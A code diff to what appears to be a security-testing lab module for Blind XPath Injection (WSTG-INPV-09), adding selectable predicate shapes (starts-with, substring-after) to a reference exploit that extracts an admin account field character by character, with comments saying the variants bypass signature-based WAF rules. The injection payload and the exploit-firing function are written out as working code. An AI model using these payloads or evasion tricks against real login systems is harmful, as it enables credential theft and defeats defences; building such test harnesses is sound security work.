@@ -39,16 +39,39 @@ function isAuthenticated(doc, username, password) {
   }
 }
 
-// Reference blind extraction: pull the admin account field char-by-char using a
-// boolean probe. probe(username, password) -> Promise<boolean authenticated>.
-export async function extractBlind(adminUsername, probe, maxLen = 64) {
+// Reference blind extraction with selectable predicate shape. Each strategy
+// uses a different XPath function to evaluate "the next character of the admin
+// account field is `c`" while reading only the auth/no-auth signal — so a
+// signature WAF that lists one function-name is bypassed by another.
+//
+//   substring   — the textbook shape: substring(field, pos, 1) = 'c'. Loud,
+//                 trivially listed by every WAF that knows the technique.
+//   starts-with — prefix-anchored: starts-with(field, 'recovered' + 'c').
+//   sub-after   — compose substring-after with starts-with: lop off the known
+//                 prefix and ask whether the remaining tail starts with 'c'.
+export async function extractBlind(adminUsername, probe, opts = {}) {
+  const {
+    strategy = 'blind:substring',
+    maxLen = 64,
+  } = opts
   const charset = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
+  const field = `//user[username/text()='${adminUsername}']/account/text()`
+
   let secret = ''
   for (let pos = 1; pos <= maxLen; pos++) {
     const hits = await Promise.all([...charset].map(async (c) => {
-      // username='zz' OR <bool> OR ('a'='b' AND password=...) ; `and` binds
-      // tighter than `or`, so the predicate reduces to <bool>.
-      const bool = `substring(//user[username/text()='${adminUsername}']/account/text(),${pos},1)='${c}'`
+      let bool
+      if (strategy === 'blind:starts-with') {
+        bool = `starts-with(${field},'${secret}${c}')`
+      } else if (strategy === 'blind:sub-after') {
+        // Compose substring-after with starts-with: strip the known prefix
+        // and assert the remaining tail starts with `c`. Survives a rule
+        // keyed on a bareword `substring(` token because the `-after` suffix
+        // sits immediately after the function name.
+        bool = `starts-with(substring-after(${field},'${secret}'),'${c}')`
+      } else {
+        bool = `substring(${field},${pos},1)='${c}'`
+      }
       const u = `zz' or ${bool} or 'a'='b`
       return (await probe(u, 'zz')) ? c : null
     }))
@@ -62,7 +85,7 @@ export async function extractBlind(adminUsername, probe, maxLen = 64) {
 export const classDef = {
   wstgId: 'WSTG-INPV-09',
   class: 'Blind XPath Injection',
-  defenceTiers: [0],
+  defenceTiers: [0, 1],
   Scenario,
   needsSignup: false,
   canaryRuntime: true,
@@ -89,9 +112,15 @@ export const classDef = {
     return { status: 200, body: renderPage(loginForm(scenario, 'Those credentials could not be verified.')) }
   },
 
-  async fireExploit({ baseUrl, scenario, helpers }) {
+  async fireExploit({ baseUrl, scenario, payload }) {
     const url = `${baseUrl}${scenario.endpoint.path}`
     const sleep = (ms) => new Promise(r => setTimeout(r, ms))
+    // The payload sentinel selects which predicate shape the blind probes
+    // use — see extractBlind. Any non-recognised value falls back to the
+    // textbook substring()-keyed shape.
+    const strategy = (typeof payload === 'string' && payload.startsWith('blind:'))
+      ? payload
+      : 'blind:substring'
     const probe = async (u, p) => {
       let lastErr
       for (let attempt = 0; attempt < 6; attempt++) {
@@ -108,7 +137,7 @@ export const classDef = {
       }
       throw lastErr
     }
-    const secret = await extractBlind(scenario.adminUsername, probe)
+    const secret = await extractBlind(scenario.adminUsername, probe, { strategy })
     return { status: 200, body: secret }
   },
 
